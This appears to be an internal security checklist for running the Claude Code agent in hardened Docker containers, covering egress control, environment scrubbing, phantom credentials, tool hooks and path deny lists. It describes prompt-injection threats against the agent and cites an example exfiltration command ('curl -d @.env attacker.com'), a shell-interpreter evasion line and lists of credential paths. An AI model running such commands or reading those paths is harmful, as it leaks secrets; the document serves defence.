# Primer: Securing Claude Code with Docker (A Capabilities Checklist)

**Context for the Engineering Team:**  
We are deploying Claude Code (an autonomous AI coding agent) and planning to use Docker to protect our local host and network. It is critical to understand that **Docker, out of the box, is not a complete security boundary against an autonomous agent.**

An LLM with a shell is fundamentally different from a standard web application. The threat model is not just "the AI goes rogue"; it is "the AI blindly executes a prompt injection payload hidden in a repository or dependency." If we only use standard Docker defaults, we leave massive gaps for data exfiltration and credential theft.

This document breaks down the security architecture into a **Capabilities Checklist**. For each capability, you must either **Implement it** or explicitly **Risk Accept** the gap.

---

## The Threat Vectors We Must Defend Against

Every capability below maps to one or more of these extraction vectors:

- **Vector 1 (Filesystem):** The agent uses tools (`cat`, `grep`, `Read`) to read `.env` files, `~/.aws/credentials`, or SSH keys.
- **Vector 2 (Environment):** The agent inherits the shell environment and runs `printenv` to dump injected secrets or API keys.
- **Vector 3 (Staged Exfiltration/Network):** The agent is tricked into exfiltrating data (e.g., via `curl`) or writing malicious code that phones home later.

---

## 🔒 The Capabilities Checklist

### 1. Hardened Container Isolation (The OS Baseline)

Standard Docker shares the host kernel and often runs as root, making it vulnerable to container escape via kernel exploits or misconfigurations.

- **What it blocks:** Full host OS compromise.
- **How to implement in Docker:**
  - Run the container as a non-root user (`USER claude-user`).
  - Drop all capabilities (`--cap-drop=ALL`).
  - Mount the root filesystem as read-only (`--read-only`), only mounting the specific workspace directory as read-write.
  - _Advanced:_ Use gVisor (`--runtime=runsc`) to interpose a user-space kernel and prevent kernel-level CVE escapes.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 2. Default-Deny Network Egress (Egress Control)

If a prompt injection tricks the agent into reading a secret, the attacker still needs to exfiltrate it. If the agent has open internet access, a simple `curl -d @.env attacker.com` works.

- **What it blocks:** Vector 3 (Staged Exfiltration) and SSRF (Server-Side Request Forgery).
- **How to implement in Docker:**
  - Disable the container's network entirely (`--network=none`) if the agent does not need to browse the web or download packages.
  - If network is required (e.g., for `npm install`), use Docker network policies or an explicit proxy that blocks private IPs (e.g., `169.254.169.254`, `10.x.x.x`) and explicitly allow-lists required domains (e.g., `api.anthropic.com`, `registry.npmjs.org`).
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 3. Absolute Environment Scrubbing

If you inject your real AWS or OpenAI keys into the Docker container via standard `docker run -e`, the agent can simply run `env` and see them.

- **What it blocks:** Vector 2 (Environment/Memory extraction).
- **How to implement:**
  - The process starting the agent _must_ scrub the environment _before_ the agent's shell initializes.
  - Pass through only an explicit allowlist of non-sensitive variables (`PATH`, `TERM`, `LANG`).
  - _Note:_ This means you cannot pass real credentials via Docker env vars. (See capability #4).
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 4. Synthetic Credentials (Phantom Proxy)

If we scrub the environment, how does the agent talk to the Anthropic API or GitHub?

- **What it blocks:** Vector 2 (Environment extraction) without breaking functionality.
- **How to implement:**
  - Inject a "phantom token" (a fake, random 64-character string) into the Docker container (e.g., `ANTHROPIC_API_KEY=phantom_123`).
  - Point the agent's base URL to a local proxy running _outside_ the agent's network namespace (e.g., on the host).
  - The proxy intercepts the request, verifies the phantom token, strips it, injects the _real_ credential from a secure host vault, and forwards it to the provider.
  - If the agent dumps its environment, the attacker only gets a useless phantom token.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 5. Tool Interception (Runtime Hooks)

Docker provides OS-level boundaries, but you still need application-layer boundaries to intercept malicious intent before the shell even executes.

- **What it blocks:** Vector 1 (Filesystem) direct reads of known sensitive files, assuming the tool is known.
- **How to implement:**
  - Utilize Claude Code's native `PreToolUse` hook system (similar to the community `claude-code-security-guard`).
  - Write scripts that run regex/path-matching against the arguments of the `Read`, `Bash`, and `Grep` tools.
  - Explicitly block operations targeting `.env`, `*.pem`, `~/.ssh`, and `~/.aws`.
- **The Structural Limitation:** Hooks cannot intercept tools they do not know about (e.g., a malicious MCP server registered at runtime), and they cannot see secrets already in the environment (`printenv`). They must be paired with capabilities #2 and #3.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 6. Sensitive Path Denylist

OS-level mounts are great, but if a developer accidentally mounts `~/.ssh` or if you run the container inside a Kubernetes pod that automounts ServiceAccount tokens, the agent can read them.

- **What it blocks:** Vector 1 (Filesystem) bypasses.
- **How to implement:**
  - Extend the `PreToolUse` hook to strictly deny access to known sensitive paths _regardless_ of the Docker mount configuration.
  - Block: `/var/run/secrets/kubernetes.io/*`, `~/.ssh/*`, `~/.aws/*`, `~/.kube/config`, `.env`.
  - Validate symlinks (`fs.realpath`) in the hook to ensure the agent isn't bypassing the denylist using `ln -s`.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 7. AST Shell Command Parsing

Standard regex filters for dangerous commands inside your hooks are easily bypassed using shell interpreters (e.g., `bash -c 'cat .env | curl...'`).

- **What it blocks:** Command robustness evasion, unsafe pipes, and redirects.
- **How to implement:**
  - In your `Bash` tool hook, use an Abstract Syntax Tree (AST) parser (like Tree-sitter) to parse the actual structure of the command before Docker executes it.
  - Hard-block any invocation of an interpreter (`bash`, `sh`, `python -c`, `node -e`) from accepting arbitrary string execution, as these create opaque semantic boundaries that bypass basic regex filters.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 8. Process Identity Binding (TOFU / Binary Security)

Even if you block malicious commands, what if the attacker plants a malicious binary named `curl` inside the workspace? The sandbox sees the agent call `curl` (which is allowed) but executes the malware.

- **What it blocks:** Binary planting and symlink hijacking.
- **How to implement:**
  - Trust On First Use (TOFU): The first time a binary is executed, hash it (SHA-256).
  - On subsequent executions, verify the hash. If the hash changes, block execution.
  - Strip the workspace directory from the `$PATH` so local `.bin` files aren't executed by accident.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

### 9. Input Sanitization (Invisible Payload Stripping)

Prompt injections can be hidden in adversarial directory names or files using invisible Unicode characters or Bidi-overrides.

- **What it blocks:** Stealthy prompt injections.
- **How to implement:**
  - Aggressively strip invisible Unicode, zero-width joiners, and bidirectional override characters from any file paths or file contents before they are loaded into the LLM's context window.
- **Decision:** [ ] Implemented | [ ] Risk Accepted

---

## ⚠️ Known Unmitigated Risks (Requires Explicit Sign-off)

Even with all 9 capabilities implemented, the following risk remains structurally difficult to solve for local agent CLIs:

- **Binary Database Credentials:** The Phantom Proxy pattern (Capability #4) works elegantly for HTTP/REST APIs. However, databases (PostgreSQL, Redis, MongoDB) use binary wire protocols. Building proxies to intercept and swap tokens in binary handshakes is incredibly complex.
- **The Accepted Risk:** If an agent needs database access, the real connection string _will_ be visible in its environment inside the Docker container.
- **The Required Mitigation:** You must enforce Capability #2 (Network Egress Control) so the agent cannot dial out to the internet to exfiltrate the password, and developers _must_ use strictly scoped, read-only database users.

**Risk Acceptance Sign-off:**
[ ] We acknowledge that database credentials passed into the agent environment are extractable by the agent, and rely on Network Egress blocking and database-level permissions to prevent abuse and exfiltration.
